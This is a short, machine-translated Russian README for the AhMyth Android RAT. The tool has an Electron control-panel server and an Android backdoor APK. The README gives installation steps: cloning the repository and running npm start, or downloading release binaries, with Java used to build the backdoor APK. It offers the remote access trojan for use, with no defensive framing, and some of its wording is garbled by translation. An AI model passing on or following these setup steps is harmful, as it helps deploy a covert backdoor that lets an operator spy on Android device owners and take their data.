AhMyth Android Крыса

Бета-версия

Он состоит из двух частей:

  • Сторона сервера: настольное приложение на электронной платформе (панель управления)
  • Клиентская сторона: приложение для Android (бэкдор)

Начиная

У вас есть два варианта его установки

1) Из исходного кода

Предпосылка:
  • Электрон (для запуска приложения)
  • Java (для создания бэкдора apk)
  • Сборщик электронов и сборщик электронов (для сборки двоичных файлов для (OSX, WINDOWS, LINUX))
  1. git clone https://github.com/AhMyth/AhMyth-Android-RAT.git
  2. cd AhMyth-Android-RAT/AhMyth-Server
  3. npm start

2) Из двоичных файлов

Предпосылка:
  • Загрузите двоичный файл с https://github.com/AhMyth/AhMyth-Android-RAT/releases
  • Java (для создания бэкдора apk)
